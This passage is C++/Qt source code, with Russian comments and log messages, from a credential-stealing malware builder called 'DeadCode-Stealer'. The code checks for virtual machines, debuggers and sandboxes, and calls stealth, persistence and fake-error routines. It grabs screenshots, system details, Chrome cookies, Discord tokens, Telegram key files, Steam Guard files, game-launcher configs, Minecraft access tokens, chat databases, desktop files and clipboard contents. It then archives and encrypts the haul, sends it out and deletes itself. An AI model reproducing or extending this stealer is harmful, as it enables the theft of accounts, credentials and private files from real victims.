        curl_easy_setopt(curl, CURLOPT_USERAGENT, "DeadCode-Stealer/1.0");

        std::string response;
        curl_easy_setopt(curl, CURLOPT_WRITEFUNCTION, WriteCallback);
        curl_easy_setopt(curl, CURLOPT_WRITEDATA, &response);

        CURLcode res = curl_easy_perform(curl);
        if (res != CURLE_OK) {
            emitLog("Ошибка проверки статуса GitHub Actions: " + QString::fromStdString(curl_easy_strerror(res)));
        } else {
            QJsonDocument doc = QJsonDocument::fromJson(QByteArray::fromStdString(response));
            QJsonObject obj = doc.object();
            QJsonArray runs = obj["workflow_runs"].toArray();
            if (!runs.isEmpty()) {
                workflowRunId = QString::number(runs[0].toObject()["id"].toInt());
                emitLog("Получен ID workflow: " + workflowRunId);
            }
        }

        curl_slist_free_all(headers);
        curl_easy_cleanup(curl);
        return;
    }

    CURL* curl = curl_easy_init();
    if (!curl) {
        emitLog("Ошибка: Не удалось инициализировать CURL для проверки статуса");
        return;
    }

    std::string url = "https://api.github.com/repos/" + config.githubRepo + "/actions/runs/" + workflowRunId.toStdString();
    std::string authHeader = "Authorization: token " + config.githubToken;
    struct curl_slist* headers = nullptr;
    headers = curl_slist_append(headers, "Accept: application/vnd.github.v3+json");
    headers = curl_slist_append(headers, authHeader.c_str());

    curl_easy_setopt(curl, CURLOPT_URL, url.c_str());
    curl_easy_setopt(curl, CURLOPT_HTTPHEADER, headers);
    curl_easy_setopt(curl, CURLOPT_USERAGENT, "DeadCode-Stealer/1.0");

    std::string response;
    curl_easy_setopt(curl, CURLOPT_WRITEFUNCTION, WriteCallback);
    curl_easy_setopt(curl, CURLOPT_WRITEDATA, &response);

    CURLcode res = curl_easy_perform(curl);
    if (res != CURLE_OK) {
        emitLog("Ошибка проверки статуса GitHub Actions: " + QString::fromStdString(curl_easy_strerror(res)));
    } else {
        QJsonDocument doc = QJsonDocument::fromJson(QByteArray::fromStdString(response));
        QJsonObject obj = doc.object();
        QString status = obj["status"].toString();
        QString conclusion = obj["conclusion"].toString();

        emitLog("Статус сборки: " + status + ", Заключение: " + conclusion);

        if (status == "completed") {
            statusCheckTimer->stop();
            if (conclusion == "success") {
                emitLog("Сборка через GitHub Actions успешно завершена");
                emit startStealSignal();
            } else {
                emitLog("Сборка через GitHub Actions завершилась с ошибкой");
            }
            isBuilding = false;
            workflowRunId.clear();
        }
    }

    curl_slist_free_all(headers);
    curl_easy_cleanup(curl);
}

// Запуск процесса кражи данных
void MainWindow::startStealProcess() {
    emitLog("Запуск процесса кражи данных...");

    std::string tempDir = std::string(getenv("TEMP")) + "\\DeadCode_" + generateRandomString(8);
    try {
        std::filesystem::create_directories(tempDir);
        emitLog("Создана временная директория: " + QString::fromStdString(tempDir));
    } catch (const std::exception& e) {
        emitLog("Ошибка создания временной директории: " + QString::fromStdString(e.what()));
        return;
    }

    QThread* thread = new QThread;
    StealerWorker* worker = new StealerWorker(this, tempDir);
    worker->moveToThread(thread);

    connect(thread, &QThread::started, worker, &StealerWorker::process);
    connect(worker, &StealerWorker::finished, thread, &QThread::quit);
    connect(worker, &StealerWorker::finished, worker, &StealerWorker::deleteLater);
    connect(thread, &QThread::finished, thread, &QThread::deleteLater);

    thread->start();
}

// Основная функция кражи и отправки данных
void MainWindow::StealAndSendData(const std::string& tempDir) {
    emitLog("Начало процесса кражи и отправки данных...");

    // Выполняем антианализ
    if (AntiAnalysis()) {
        emitLog("Антианализ сработал, завершение работы");
        return;
    }

    // Выполняем скрытность, персистентность и фейковую ошибку
    Stealth();
    Persist();
    FakeError();

    // Выполняем полиморфный и мусорный код
    Polymorphic::executePolymorphicCode();
    JunkCode::executeJunkCode();

    // Сбрасываем список файлов для отправки
    screenshotsPaths.clear();

    // Выполняем кражу данных в зависимости от конфигурации
    if (config.screenshot) {
        takeScreenshot(tempDir);
    }
    if (config.systemInfo) {
        collectSystemInfo(tempDir);
    }
    if (config.cookies || config.passwords) {
        stealBrowserData(tempDir);
    }
    if (config.discord) {
        stealDiscordData(tempDir);
    }
    if (config.telegram) {
        stealTelegramData(tempDir);
    }
    if (config.steam) {
        stealSteamData(tempDir);
    }
    if (config.epic) {
        stealEpicData(tempDir);
    }
    if (config.roblox) {
        stealRobloxData(tempDir);
    }
    if (config.battlenet) {
        stealBattleNetData(tempDir);
    }
    if (config.minecraft) {
        stealMinecraftData(tempDir);
    }
    if (config.chatHistory) {
        stealChatHistory(tempDir);
    }
    if (config.fileGrabber) {
        stealFiles(tempDir);
    }
    if (config.socialEngineering) {
        collectSocialEngineeringData(tempDir);
    }

    // Если нет данных для отправки, завершаем
    if (screenshotsPaths.empty()) {
        emitLog("Нет данных для отправки");
        return;
    }

    // Создаем архив
    std::string archivePath = tempDir + "\\stolen_data.zip";
    archiveData(tempDir, archivePath);

    // Шифруем архив, если включено шифрование
    std::string finalPath = archivePath;
    if (!config.encryptionKey1.empty() && !config.encryptionKey2.empty()) {
        std::string encryptedPath = tempDir + "\\stolen_data_encrypted.zip";
        encryptData(archivePath, encryptedPath);
        finalPath = encryptedPath;
    }

    // Отправляем данные
    sendData(QString::fromStdString(finalPath), {finalPath});

    // Удаляем временные файлы
    try {
        std::filesystem::remove_all(tempDir);
        emitLog("Временные файлы удалены: " + QString::fromStdString(tempDir));
    } catch (const std::exception& e) {
        emitLog("Ошибка удаления временных файлов: " + QString::fromStdString(e.what()));
    }

    // Выполняем самоуничтожение, если включено
    if (config.selfDestruct) {
        SelfDestruct();
    }

    emitLog("Процесс кражи и отправки данных завершен");
}

// Создание скриншота
void MainWindow::takeScreenshot(const std::string& dir) {
    emitLog("Создание скриншота...");

    QScreen* screen = QGuiApplication::primaryScreen();
    if (!screen) {
        emitLog("Ошибка: Не удалось получить доступ к экрану");
        return;
    }

    QPixmap screenshot = screen->grabWindow(0);
    std::string screenshotPath = dir + "\\screenshot.png";
    if (screenshot.save(QString::fromStdString(screenshotPath), "PNG")) {
        emitLog("Скриншот сохранен: " + QString::fromStdString(screenshotPath));
        screenshotsPaths.push_back(screenshotPath);
    } else {
        emitLog("Ошибка: Не удалось сохранить скриншот");
    }
}

// Сбор системной информации
void MainWindow::collectSystemInfo(const std::string& dir) {
    emitLog("Сбор системной информации...");

    std::string info;
    info += "Computer Name: " + QHostInfo::localHostName().toStdString() + "\n";
    info += "User Name: " + QString::fromWCharArray(_wgetenv(L"USERNAME")).toStdString() + "\n";
    info += "OS Version: " + QSysInfo::prettyProductName().toStdString() + "\n";

    // Получение IP-адреса
    char hostname[256];
    if (gethostname(hostname, sizeof(hostname)) == 0) {
        struct hostent* host = gethostbyname(hostname);
        if (host) {
            info += "IP Address: " + std::string(inet_ntoa(*(struct in_addr*)*host->h_addr_list)) + "\n";
        }
    }

    // Получение информации о процессоре
    SYSTEM_INFO sysInfo;
    GetSystemInfo(&sysInfo);
    info += "Processor Architecture: " + std::to_string(sysInfo.wProcessorArchitecture) + "\n";
    info += "Number of Processors: " + std::to_string(sysInfo.dwNumberOfProcessors) + "\n";

    // Получение информации о памяти
    MEMORYSTATUSEX memInfo;
    memInfo.dwLength = sizeof(MEMORYSTATUSEX);
    GlobalMemoryStatusEx(&memInfo);
    info += "Total Physical Memory: " + std::to_string(memInfo.ullTotalPhys / (1024 * 1024)) + " MB\n";
    info += "Available Physical Memory: " + std::to_string(memInfo.ullAvailPhys / (1024 * 1024)) + " MB\n";

    std::string sysInfoPath = dir + "\\system_info.txt";
    std::ofstream outFile(sysInfoPath);
    if (outFile.is_open()) {
        outFile << info;
        outFile.close();
        emitLog("Системная информация сохранена: " + QString::fromStdString(sysInfoPath));
        screenshotsPaths.push_back(sysInfoPath);
    } else {
        emitLog("Ошибка: Не удалось сохранить системную информацию");
    }
}

// Кража данных браузера
void MainWindow::stealBrowserData(const std::string& dir) {
    emitLog("Начало кражи данных браузера...");

    std::string browserDir = dir + "\\BrowserData";
    try {
        std::filesystem::create_directories(browserDir);
    } catch (const std::exception& e) {
        emitLog("Ошибка создания директории для данных браузера: " + QString::fromStdString(e.what()));
        return;
    }

    // Пример: кража куки из Chrome
    if (config.cookies) {
        char* localAppDataPath = nullptr;
        size_t len;
        if (_dupenv_s(&localAppDataPath, &len, "LOCALAPPDATA") != 0 || !localAppDataPath) {
            emitLog("Ошибка: Не удалось получить путь к LOCALAPPDATA для Chrome");
            return;
        }
        std::string localAppData(localAppDataPath);
        free(localAppDataPath);

        std::string chromePath = localAppData + "\\Google\\Chrome\\User Data\\Default\\Cookies";
        if (std::filesystem::exists(chromePath)) {
            // Копируем файл куки (в реальном приложении нужно расшифровать куки, но это упрощенный пример)
            std::string outPath = browserDir + "\\chrome_cookies.sqlite";
            try {
                std::filesystem::copy_file(chromePath, outPath, std::filesystem::copy_options::overwrite_existing);
                emitLog("Куки Chrome сохранены: " + QString::fromStdString(outPath));
                screenshotsPaths.push_back(outPath);
            } catch (const std::exception& e) {
                emitLog("Ошибка копирования куки Chrome: " + QString::fromStdString(e.what()));
            }
        } else {
            emitLog("Файл куки Chrome не найден");
        }
    }

    // Пример: кража паролей из Chrome
    if (config.passwords) {
        std::string loginDataPath = browserDir + "\\chrome_logins.txt";
        std::ofstream outFile(loginDataPath);
        if (outFile.is_open()) {
            outFile << "Chrome Passwords: [Placeholder - Requires decryption]\n";
            outFile.close();
            emitLog("Пароли Chrome сохранены (заглушка): " + QString::fromStdString(loginDataPath));
            screenshotsPaths.push_back(loginDataPath);
        } else {
            emitLog("Ошибка: Не удалось сохранить пароли Chrome");
        }
    }

    emitLog("Кража данных браузера завершена");
}

// Кража данных Discord
void MainWindow::stealDiscordData(const std::string& dir) {
    emitLog("Начало кражи данных Discord...");

    std::string discordDir = dir + "\\Discord";
    try {
        std::filesystem::create_directories(discordDir);
    } catch (const std::exception& e) {
        emitLog("Ошибка создания директории для данных Discord: " + QString::fromStdString(e.what()));
        return;
    }

    char* appDataPath = nullptr;
    size_t len;
    if (_dupenv_s(&appDataPath, &len, "APPDATA") != 0 || !appDataPath) {
        emitLog("Ошибка: Не удалось получить путь к APPDATA для Discord");
        return;
    }
    std::string appData(appDataPath);
    free(appDataPath);

    std::string discordPath = appData + "\\discord\\Local Storage\\leveldb\\";
    if (std::filesystem::exists(discordPath)) {
        std::string tokensPath = discordDir + "\\discord_tokens.txt";
        std::ofstream outFile(tokensPath);
        if (!outFile.is_open()) {
            emitLog("Ошибка: Не удалось создать файл для токенов Discord");
            return;
        }

        std::string tokens;
        try {
            for (const auto& entry : std::filesystem::directory_iterator(discordPath)) {
                if (entry.path().extension() == ".ldb") {
                    std::ifstream file(entry.path(), std::ios::binary);
                    if (!file.is_open()) continue;
                    std::string content((std::istreambuf_iterator<char>(file)), std::istreambuf_iterator<char>());
                    file.close();

                    std::regex tokenRegex("[\\w-]{24}\\.[\\w-]{6}\\.[\\w-]{27}");
                    std::smatch match;
                    std::string::const_iterator searchStart(content.cbegin());
                    while (std::regex_search(searchStart, content.cend(), match, tokenRegex)) {
                        tokens += "Discord Token: " + match[0].str() + "\n";
                        searchStart = match.suffix().first;
                    }
                }
            }
        } catch (const std::exception& e) {
            emitLog("Ошибка при обработке данных Discord: " + QString::fromStdString(e.what()));
        }

        if (!tokens.empty()) {
            outFile << tokens;
            outFile.close();
            emitLog("Токены Discord сохранены: " + QString::fromStdString(tokensPath));
            screenshotsPaths.push_back(tokensPath);
        } else {
            outFile.close();
            emitLog("Токены Discord не найдены");
        }
    } else {
        emitLog("Директория Discord не найдена");
    }

    emitLog("Кража данных Discord завершена");
}

// Кража данных Telegram
void MainWindow::stealTelegramData(const std::string& dir) {
    emitLog("Начало кражи данных Telegram...");

    std::string telegramDir = dir + "\\Telegram";
    try {
        std::filesystem::create_directories(telegramDir);
    } catch (const std::exception& e) {
        emitLog("Ошибка создания директории для данных Telegram: " + QString::fromStdString(e.what()));
        return;
    }

    char* appDataPath = nullptr;
    size_t len;
    if (_dupenv_s(&appDataPath, &len, "APPDATA") != 0 || !appDataPath) {
        emitLog("Ошибка: Не удалось получить путь к APPDATA для Telegram");
        return;
    }
    std::string appData(appDataPath);
    free(appDataPath);

    std::string telegramPath = appData + "\\Telegram Desktop\\tdata\\";
    if (std::filesystem::exists(telegramPath)) {
        try {
            for (const auto& entry : std::filesystem::directory_iterator(telegramPath)) {
                if (entry.path().filename().string().find("key_data") != std::string::npos) {
                    std::string outPath = telegramDir + "\\key_data";
                    std::filesystem::copy_file(entry.path(), outPath, std::filesystem::copy_options::overwrite_existing);
                    emitLog("Ключ Telegram сохранен: " + QString::fromStdString(outPath));
                    screenshotsPaths.push_back(outPath);
                }
            }
        } catch (const std::exception& e) {
            emitLog("Ошибка при обработке данных Telegram: " + QString::fromStdString(e.what()));
        }
    } else {
        emitLog("Директория Telegram не найдена");
    }

    emitLog("Кража данных Telegram завершена");
}

// Кража данных Steam
void MainWindow::stealSteamData(const std::string& dir) {
    emitLog("Начало кражи данных Steam...");

    std::string steamDir = dir + "\\Steam";
    try {
        std::filesystem::create_directories(steamDir);
    } catch (const std::exception& e) {
        emitLog("Ошибка создания директории для данных Steam: " + QString::fromStdString(e.what()));
        return;
    }

    // Поиск пути к Steam
    HKEY hKey;
    if (RegOpenKeyExA(HKEY_CURRENT_USER, "Software\\Valve\\Steam", 0, KEY_READ, &hKey) != ERROR_SUCCESS) {
        emitLog("Ошибка: Не удалось открыть ключ реестра Steam");
        return;
    }

    char steamPath[MAX_PATH];
    DWORD pathSize = sizeof(steamPath);
    if (RegQueryValueExA(hKey, "SteamPath", nullptr, nullptr, (LPBYTE)steamPath, &pathSize) != ERROR_SUCCESS) {
        emitLog("Ошибка: Не удалось получить путь к Steam");
        RegCloseKey(hKey);
        return;
    }
    RegCloseKey(hKey);

    std::string steamBasePath = steamPath;
    if (!std::filesystem::exists(steamBasePath)) {
        emitLog("Директория Steam не найдена: " + QString::fromStdString(steamBasePath));
        return;
    }

    // Кража конфигурационных файлов
    std::string configPath = steamBasePath + "\\config\\config.vdf";
    if (std::filesystem::exists(configPath)) {
        std::string outPath = steamDir + "\\config.vdf";
        try {
            std::filesystem::copy_file(configPath, outPath, std::filesystem::copy_options::overwrite_existing);
            emitLog("Конфигурация Steam сохранена: " + QString::fromStdString(outPath));
            screenshotsPaths.push_back(outPath);
        } catch (const std::exception& e) {
            emitLog("Ошибка копирования конфигурации Steam: " + QString::fromStdString(e.what()));
        }
    }

    // Кража MA-файлов, если включено
    if (config.steamMAFile) {
        std::string maFilesPath = steamBasePath + "\\config\\SteamGuard";
        if (std::filesystem::exists(maFilesPath)) {
            try {
                for (const auto& entry : std::filesystem::directory_iterator(maFilesPath)) {
                    if (entry.path().extension() == ".maFile") {
                        std::string outPath = steamDir + "\\" + entry.path().filename().string();
                        std::filesystem::copy_file(entry.path(), outPath, std::filesystem::copy_options::overwrite_existing);
                        emitLog("MA-файл Steam сохранен: " + QString::fromStdString(outPath));
                        screenshotsPaths.push_back(outPath);
                    }
                }
            } catch (const std::exception& e) {
                emitLog("Ошибка копирования MA-файлов Steam: " + QString::fromStdString(e.what()));
            }
        } else {
            emitLog("MA-файлы Steam не найдены");
        }
    }

    emitLog("Кража данных Steam завершена");
}

// Кража данных Epic Games
void MainWindow::stealEpicData(const std::string& dir) {
    emitLog("Начало кражи данных Epic Games...");

    std::string epicDir = dir + "\\EpicGames";
    try {
        std::filesystem::create_directories(epicDir);
    } catch (const std::exception& e) {
        emitLog("Ошибка создания директории для данных Epic Games: " + QString::fromStdString(e.what()));
        return;
    }

    char* localAppDataPath = nullptr;
    size_t len;
    if (_dupenv_s(&localAppDataPath, &len, "LOCALAPPDATA") != 0 || !localAppDataPath) {
        emitLog("Ошибка: Не удалось получить путь к LOCALAPPDATA для Epic Games");
        return;
    }
    std::string localAppData(localAppDataPath);
    free(localAppDataPath);

    std::string epicPath = localAppData + "\\EpicGamesLauncher\\Saved\\Config\\Windows\\";
    if (std::filesystem::exists(epicPath)) {
        try {
            for (const auto& entry : std::filesystem::directory_iterator(epicPath)) {
                if (entry.path().filename().string() == "GameUserSettings.ini") {
                    std::string outPath = epicDir + "\\GameUserSettings.ini";
                    std::filesystem::copy_file(entry.path(), outPath, std::filesystem::copy_options::overwrite_existing);
                    emitLog("Настройки Epic Games сохранены: " + QString::fromStdString(outPath));
                    screenshotsPaths.push_back(outPath);
                }
            }
        } catch (const std::exception& e) {
            emitLog("Ошибка при обработке данных Epic Games: " + QString::fromStdString(e.what()));
        }
    } else {
        emitLog("Директория Epic Games не найдена");
    }

    emitLog("Кража данных Epic Games завершена");
}

// Кража данных Roblox
void MainWindow::stealRobloxData(const std::string& dir) {
    emitLog("Начало кражи данных Roblox...");

    std::string robloxDir = dir + "\\Roblox";
    try {
        std::filesystem::create_directories(robloxDir);
    } catch (const std::exception& e) {
        emitLog("Ошибка создания директории для данных Roblox: " + QString::fromStdString(e.what()));
        return;
    }

    char* appDataPath = nullptr;
    size_t len;
    if (_dupenv_s(&appDataPath, &len, "APPDATA") != 0 || !appDataPath) {
        emitLog("Ошибка: Не удалось получить путь к APPDATA для Roblox");
        return;
    }
    std::string appData(appDataPath);
    free(appDataPath);

    std::string robloxPath = appData + "\\Roblox\\";
    if (std::filesystem::exists(robloxPath)) {
        try {
            for (const auto& entry : std::filesystem::directory_iterator(robloxPath)) {
                if (entry.path().filename().string() == "GlobalBasicSettings_13.ini") {
                    std::string outPath = robloxDir + "\\GlobalBasicSettings_13.ini";
                    std::filesystem::copy_file(entry.path(), outPath, std::filesystem::copy_options::overwrite_existing);
                    emitLog("Настройки Roblox сохранены: " + QString::fromStdString(outPath));
                    screenshotsPaths.push_back(outPath);
                }
            }
        } catch (const std::exception& e) {
            emitLog("Ошибка при обработке данных Roblox: " + QString::fromStdString(e.what()));
        }
    } else {
        emitLog("Директория Roblox не найдена");
    }

    emitLog("Кража данных Roblox завершена");
}

// Кража данных Battle.net
void MainWindow::stealBattleNetData(const std::string& dir) {
    emitLog("Начало кражи данных Battle.net...");

    std::string battleNetDir = dir + "\\BattleNet";
    try {
        std::filesystem::create_directories(battleNetDir);
    } catch (const std::exception& e) {
        emitLog("Ошибка создания директории для данных Battle.net: " + QString::fromStdString(e.what()));
        return;
    }

    char* appDataPath = nullptr;
    size_t len;
    if (_dupenv_s(&appDataPath, &len, "APPDATA") != 0 || !appDataPath) {
        emitLog("Ошибка: Не удалось получить путь к APPDATA для Battle.net");
        return;
    }
    std::string appData(appDataPath);
    free(appDataPath);

    std::string battleNetPath = appData + "\\Battle.net\\";
    if (std::filesystem::exists(battleNetPath)) {
        try {
            for (const auto& entry : std::filesystem::recursive_directory_iterator(battleNetPath)) {
                if (entry.path().filename().string().find("Battle.net.config") != std::string::npos) {
                    std::string outPath = battleNetDir + "\\Battle.net.config";
                    std::filesystem::copy_file(entry.path(), outPath, std::filesystem::copy_options::overwrite_existing);
                    emitLog("Конфигурация Battle.net сохранена: " + QString::fromStdString(outPath));
                    screenshotsPaths.push_back(outPath);
                }
            }
        } catch (const std::exception& e) {
            emitLog("Ошибка при обработке данных Battle.net: " + QString::fromStdString(e.what()));
        }
    } else {
        emitLog("Директория Battle.net не найдена");
    }

    emitLog("Кража данных Battle.net завершена");
}

// Кража данных Minecraft
void MainWindow::stealMinecraftData(const std::string& dir) {
    if (!config.minecraft) {
        emitLog("Кража данных Minecraft отключена в конфигурации");
        return;
    }

    emitLog("Начало кражи данных Minecraft...");

    // Получаем путь к директории Minecraft
    char* appDataPath = nullptr;
    size_t len;
    if (_dupenv_s(&appDataPath, &len, "APPDATA") != 0 || !appDataPath) {
        emitLog("Ошибка: Не удалось получить путь к APPDATA для Minecraft");
        return;
    }
    std::string appData(appDataPath);
    free(appDataPath);

    std::string minecraftPath = appData + "\\.minecraft\\";
    if (!std::filesystem::exists(minecraftPath)) {
        emitLog("Директория Minecraft не найдена: " + QString::fromStdString(minecraftPath));
        return;
    }

    // Создаем директорию для хранения данных Minecraft
    std::string minecraftDir = dir + "\\Minecraft";
    try {
        std::filesystem::create_directories(minecraftDir);
    } catch (const std::exception& e) {
        emitLog("Ошибка создания директории для Minecraft: " + QString::fromStdString(e.what()));
        return;
    }

    // Кража launcher_profiles.json (содержит токены и профили)
    std::string profilesPath = minecraftPath + "launcher_profiles.json";
    if (std::filesystem::exists(profilesPath)) {
        try {
            std::ifstream file(profilesPath);
            if (!file.is_open()) {
                emitLog("Ошибка: Не удалось открыть launcher_profiles.json");
            } else {
                std::string content((std::istreambuf_iterator<char>(file)), std::istreambuf_iterator<char>());
                file.close();

                // Сохраняем файл
                std::string outPath = minecraftDir + "\\launcher_profiles.json";
                std::ofstream outFile(outPath);
                if (outFile.is_open()) {
                    outFile << content;
                    outFile.close();
                    emitLog("Успешно сохранен launcher_profiles.json: " + QString::fromStdString(outPath));

                    // Извлекаем токены, UUID и имена пользователей
                    std::string result;
                    std::regex tokenRegex("\"accessToken\":\"[a-zA-Z0-9\\-\\.]+\"");
                    std::smatch match;
                    std::string::const_iterator searchStart(content.cbegin());
                    while (std::regex_search(searchStart, content.cend(), match, tokenRegex)) {
                        result += "[Minecraft] Access Token: " + match[0].str() + "\n";
                        searchStart = match.suffix().first;
                    }

                    std::regex uuidRegex("\"uuid\":\"[a-f0-9\\-]+\"");
                    searchStart = content.cbegin();
                    while (std::regex_search(searchStart, content.cend(), match, uuidRegex)) {
                        result += "[Minecraft] UUID: " + match[0].str() + "\n";
                        searchStart = match.suffix().first;
                    }

                    std::regex usernameRegex("\"name\":\"[^\"]+\"");
                    searchStart = content.cbegin();
                    while (std::regex_search(searchStart, content.cend(), match, usernameRegex)) {
                        result += "[Minecraft] Username: " + match[0].str() + "\n";
                        searchStart = match.suffix().first;
                    }

                    // Сохраняем извлеченные данные в отдельный файл
                    std::string tokensPath = minecraftDir + "\\minecraft_tokens.txt";
                    std::ofstream tokensFile(tokensPath);
                    if (tokensFile.is_open()) {
                        tokensFile << result;
                        tokensFile.close();
                        emitLog("Извлеченные данные Minecraft сохранены: " + QString::fromStdString(tokensPath));
                        screenshotsPaths.push_back(tokensPath); // Добавляем в список для отправки
                    } else {
                        emitLog("Ошибка: Не удалось сохранить извлеченные данные Minecraft");
                    }

                    screenshotsPaths.push_back(outPath); // Добавляем сам файл в список для отправки
                } else {
                    emitLog("Ошибка: Не удалось сохранить launcher_profiles.json");
                }
            }
        } catch (const std::exception& e) {
            emitLog("Ошибка при обработке launcher_profiles.json: " + QString::fromStdString(e.what()));
        }
    } else {
        emitLog("Файл launcher_profiles.json не найден");
    }

    // Поиск других файлов (usercache.json, servers.dat)
    try {
        for (const auto& entry : std::filesystem::recursive_directory_iterator(minecraftPath)) {
            std::string filename = entry.path().filename().string();
            if (filename == "usercache.json" || filename == "servers.dat") {
                std::ifstream file(entry.path());
                if (!file.is_open()) {
                    emitLog("Ошибка: Не удалось открыть файл Minecraft: " + QString::fromStdString(filename));
                    continue;
                }
                std::string content((std::istreambuf_iterator<char>(file)), std::istreambuf_iterator<char>());
                file.close();

                std::string outPath = minecraftDir + "\\" + filename;
                std::ofstream outFile(outPath);
                if (outFile.is_open()) {
                    outFile << content;
                    outFile.close();
                    emitLog("Успешно сохранен файл Minecraft: " + QString::fromStdString(outPath));
                    screenshotsPaths.push_back(outPath); // Добавляем в список для отправки
                } else {
                    emitLog("Ошибка: Не удалось сохранить файл Minecraft: " + QString::fromStdString(filename));
                }
            }
        }
    } catch (const std::exception& e) {
        emitLog("Ошибка при обработке файлов Minecraft: " + QString::fromStdString(e.what()));
    }

    emitLog("Кража данных Minecraft завершена");
}

// Кража истории чатов
void MainWindow::stealChatHistory(const std::string& dir) {
    emitLog("Начало кражи истории чатов...");

    std::string chatDir = dir + "\\ChatHistory";
    try {
        std::filesystem::create_directories(chatDir);
    } catch (const std::exception& e) {
        emitLog("Ошибка создания директории для истории чатов: " + QString::fromStdString(e.what()));
        return;
    }

    // Пример: кража истории чатов Discord
    if (config.discord) {
        char* appDataPath = nullptr;
        size_t len;
        if (_dupenv_s(&appDataPath, &len, "APPDATA") != 0 || !appDataPath) {
            emitLog("Ошибка: Не удалось получить путь к APPDATA для истории чатов Discord");
            free(appDataPath);
            return;
        }
        std::string appData(appDataPath);
        free(appDataPath);

        std::string discordPath = appData + "\\discord\\Local Storage\\leveldb\\";
        if (std::filesystem::exists(discordPath)) {
            try {
                for (const auto& entry : std::filesystem::directory_iterator(discordPath)) {
                    if (entry.path().extension() == ".ldb") {
                        std::string outPath = chatDir + "\\discord_chat_" + entry.path().filename().string();
                        std::filesystem::copy_file(entry.path(), outPath, std::filesystem::copy_options::overwrite_existing);
                        emitLog("История чатов Discord сохранена: " + QString::fromStdString(outPath));
                        screenshotsPaths.push_back(outPath);
                    }
                }
            } catch (const std::exception& e) {
                emitLog("Ошибка при обработке истории чатов Discord: " + QString::fromStdString(e.what()));
            }
        } else {
            emitLog("Директория истории чатов Discord не найдена");
        }
    }

    // Пример: кража истории чатов Telegram
    if (config.telegram) {
        char* appDataPath = nullptr;
        size_t len;
        if (_dupenv_s(&appDataPath, &len, "APPDATA") != 0 || !appDataPath) {
            emitLog("Ошибка: Не удалось получить путь к APPDATA для истории чатов Telegram");
            free(appDataPath);
            return;
        }
        std::string appData(appDataPath);
        free(appDataPath);

        std::string telegramPath = appData + "\\Telegram Desktop\\tdata\\";
        if (std::filesystem::exists(telegramPath)) {
            try {
                for (const auto& entry : std::filesystem::directory_iterator(telegramPath)) {
                    if (entry.path().filename().string().find("chat_") != std::string::npos) {
                        std::string outPath = chatDir + "\\telegram_chat_" + entry.path().filename().string();
                        std::filesystem::copy_file(entry.path(), outPath, std::filesystem::copy_options::overwrite_existing);
                        emitLog("История чатов Telegram сохранена: " + QString::fromStdString(outPath));
                        screenshotsPaths.push_back(outPath);
                    }
                }
            } catch (const std::exception& e) {
                emitLog("Ошибка при обработке истории чатов Telegram: " + QString::fromStdString(e.what()));
            }
        } else {
            emitLog("Директория истории чатов Telegram не найдена");
        }
    }

    emitLog("Кража истории чатов завершена");
}

// Кража файлов (граббер)
void MainWindow::stealFiles(const std::string& dir) {
    emitLog("Начало кражи файлов...");

    std::string filesDir = dir + "\\GrabbedFiles";
    try {
        std::filesystem::create_directories(filesDir);
    } catch (const std::exception& e) {
        emitLog("Ошибка создания директории для файлов: " + QString::fromStdString(e.what()));
        return;
    }

    // Пример: кража файлов с рабочего стола
    char* userProfilePath = nullptr;
    size_t len;
    if (_dupenv_s(&userProfilePath, &len, "USERPROFILE") != 0 || !userProfilePath) {
        emitLog("Ошибка: Не удалось получить путь к USERPROFILE для граббера файлов");
        free(userProfilePath);
        return;
    }
    std::string userProfile(userProfilePath);
    free(userProfilePath);

    std::string desktopPath = userProfile + "\\Desktop\\";
    if (std::filesystem::exists(desktopPath)) {
        try {
            for (const auto& entry : std::filesystem::directory_iterator(desktopPath)) {
                if (entry.is_regular_file()) {
                    auto fileSize = std::filesystem::file_size(entry.path());
                    if (fileSize > 10 * 1024 * 1024) { // Пропускаем файлы больше 10 МБ
                        emitLog("Пропущен файл (слишком большой): " + QString::fromStdString(entry.path().filename().string()));
                        continue;
                    }
                    std::string outPath = filesDir + "\\" + entry.path().filename().string();
                    std::filesystem::copy_file(entry.path(), outPath, std::filesystem::copy_options::overwrite_existing);
                    emitLog("Файл с рабочего стола сохранен: " + QString::fromStdString(outPath));
                    screenshotsPaths.push_back(outPath);
                }
            }
        } catch (const std::exception& e) {
            emitLog("Ошибка при обработке файлов с рабочего стола: " + QString::fromStdString(e.what()));
        }
    } else {
        emitLog("Рабочий стол не найден");
    }

    emitLog("Кража файлов завершена");
}

// Сбор данных для социальной инженерии
void MainWindow::collectSocialEngineeringData(const std::string& dir) {
    emitLog("Сбор данных для социальной инженерии...");

    std::string seDir = dir + "\\SocialEngineering";
    try {
        std::filesystem::create_directories(seDir);
    } catch (const std::exception& e) {
        emitLog("Ошибка создания директории для данных социальной инженерии: " + QString::fromStdString(e.what()));
        return;
    }

    std::string seDataPath = seDir + "\\social_engineering.txt";
    std::ofstream outFile(seDataPath);
    if (!outFile.is_open()) {
        emitLog("Ошибка: Не удалось создать файл для данных социальной инженерии");
        return;
    }

    // Пример: сбор данных из буфера обмена
    QString clipboardData = QGuiApplication::clipboard()->text();
    if (!clipboardData.isEmpty()) {
        outFile << "Clipboard Data: " << clipboardData.toStdString() << "\n";
        emitLog("Данные из буфера обмена собраны");
    } else {
        outFile << "Clipboard Data: [Empty]\n";
        emitLog("Буфер обмена пуст");
    }

    // Пример: сбор последних введенных данных (заглушка, так как нет прямого доступа к вводу)
    outFile << "Last Input: [Not Implemented - Requires Keylogger]\n";

    outFile.close();
    emitLog("Данные для социальной инженерии сохранены: " + QString::fromStdString(seDataPath));
    screenshotsPaths.push_back(seDataPath);

    emitLog("Сбор данных для социальной инженерии завершен");
}

// Антианализ
bool MainWindow::AntiAnalysis() {
    if (!config.antiVM) {
        emitLog("Антианализ отключен в конфигурации");
        return false;
    }

    emitLog("Выполнение антианализа...");

    if (isRunningInVM()) {
        emitLog("Обнаружена виртуальная машина, завершение работы");
        return true;
    }

    // Проверка на отладчик
    if (IsDebuggerPresent()) {
        emitLog("Обнаружен отладчик, завершение работы");
        return true;
    }

    // Проверка на песочницу (упрощенный пример)
    DWORD processCount = 0;
    HANDLE hSnapshot = CreateToolhelp32Snapshot(TH32CS_SNAPPROCESS, 0);
    if (hSnapshot != INVALID_HANDLE_VALUE) {
        PROCESSENTRY32 pe32;
        pe32.dwSize = sizeof(PROCESSENTRY32);
        if (Process32First(hSnapshot, &pe32)) {
            do {
                processCount++;
            } while (Process32Next(hSnapshot, &pe32));
        }
        CloseHandle(hSnapshot);
    }
    if (processCount < 50) { // Песочницы часто имеют мало процессов
        emitLog("Обнаружена возможная песочница (мало процессов), завершение работы");
        return true;
    }

    emitLog("Антианализ пройден успешно");
    return false;
